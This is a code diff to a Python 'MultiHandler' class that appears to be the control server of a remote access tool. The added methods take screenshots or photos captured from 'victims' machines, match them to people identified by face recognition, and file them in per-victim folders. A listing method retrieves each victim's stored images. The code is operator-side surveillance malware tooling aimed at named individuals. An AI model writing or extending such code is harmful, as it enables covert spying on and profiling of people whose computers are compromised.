@@ -2,6 +2,8 @@ from modules import helper as h
 from azure import faceRec
 import threading, socket, time, sys
 import json
+from PIL import Image
+from os import listdir
 
 
 class MultiHandler:
@@ -248,7 +250,7 @@ class MultiHandler:
 		except:
 			h.info_error("Person cannot be recognized")
 
-
+	# Interact with victims' machines
 	def interact(self, session_id, cmd_data):
 		try:
 			cmd = cmd_data.split()[0]
@@ -258,5 +260,92 @@ class MultiHandler:
 		except KeyboardInterrupt:
 			sys.stdout.write("\n")
 			self.stop_server()
+			return None
+
+	# Save the Action Results (Screen shots or photos into personal Database)
+	# Filename: the image filename under pictures directory
+	def save_images(self, session_id, filename):
+		if session_id < 1:
+			h.info_error("Invalid Session")
+			return
+		try:
+			idx = session_id - 1
+			victim = self.victims['victims'][idx]
+
+			# Only save the image for identified victim
+			if not victim['identified']:
+				h.info_general("Session has not been identified")
+				return
+
+			victim_name = None
+			identified_victims = self.identified_victims['identified_victims']
+			for victim in identified_victims:
+				if victim['session_id'] == session_id:
+					victim_name = victim['profile']['name']
+					break
+
+			# Had found the victim, save the image in personal db
+			if victim_name:
+				try:
+					image_path = "./DB/pictures/" + filename
+					personal_db_image_path = "./DB/" + victim_name + "/Images/" + filename
+					image = Image.open(image_path)
+					image.save(personal_db_image_path, optimize=True, quality=10)
+					h.info_general("Saved to" + personal_db_image_path)
+					return
+				except:
+					h.info_error("Image save path error")
+					return
+			else:
+				h.info_general("Haven't found the target victim")
+				return
+
+		except:
+			h.info_error("Error in Saving the image")
+			return
+
+	# Get all history Images for specific victim (session_id)
+	# Return all image filenames under DB/{victim_name}/Images/
+	def get_all_images(self, session_id):
+		if session_id < 1:
+			h.info_error("Invalid Session")
+			return None
+
+		try:
+			idx = session_id - 1
+			victim = self.victims['victims'][idx]
+
+			# Only save the image for identified victim
+			if not victim['identified']:
+				h.info_general("Session has not been identified")
+				return None
+
+			victim_name = None
+			identified_victims = self.identified_victims['identified_victims']
+			for victim in identified_victims:
+				if victim['session_id'] == session_id:
+					victim_name = victim['profile']['name']
+					break
+
+			# Had found the victim, get all image files
+			if victim_name:
+				try:
+					personal_db_image_path = "DB/" + victim_name + "/Images/"
+					images = listdir(personal_db_image_path)
+					total_images = len(images)
+					results = {}
+					results['images'] = images
+					results['total_images'] = total_images
+					results['image_path'] = personal_db_image_path
+					return results
+				except:
+					h.info_error("Image save path error")
+					return None
+			else:
+				h.info_general("Haven't found the target victim")
+				return None
+
+		except:
+			h.info_error("Error in get the images")
 			return None
 
